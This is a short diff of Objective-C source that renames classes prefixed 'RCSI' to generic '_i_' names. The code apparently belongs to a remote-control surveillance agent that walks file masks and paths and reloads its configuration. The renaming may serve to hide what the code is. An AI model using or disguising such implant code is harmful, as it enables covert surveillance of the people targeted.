@@ -391,7 +391,7 @@ typedef struct _ApnStruct {
                 
                 if ([files count] > 0)
                   {
-                    RCSIFileSystemManager *fsManager = [[RCSIFileSystemManager alloc] init];
+                    _i_FileSystemManager *fsManager = [[_i_FileSystemManager alloc] init];
                     
                     for (NSString *fileMask in files)
                       {
@@ -476,7 +476,7 @@ typedef struct _ApnStruct {
                 
                 if ([paths count] > 0)
                   {
-                    RCSIFileSystemManager *fsManager = [[RCSIFileSystemManager alloc] init];
+                    _i_FileSystemManager *fsManager = [[_i_FileSystemManager alloc] init];
                     
                     for (NSDictionary *dictionary in paths)
                       {
@@ -553,10 +553,10 @@ typedef struct _ApnStruct {
 #endif
   
   
-  if ([[RCSIConfManager sharedInstance] mShouldReloadConfiguration] == YES)
+  if ([[_i_ConfManager sharedInstance] mShouldReloadConfiguration] == YES)
     {
-      [[RCSIConfManager sharedInstance] sendReloadNotification];
-      [[RCSIConfManager sharedInstance] setMShouldReloadConfiguration: NO];
+      [[_i_ConfManager sharedInstance] sendReloadNotification];
+      [[_i_ConfManager sharedInstance] setMShouldReloadConfiguration: NO];
     }
   
   [commandList release];
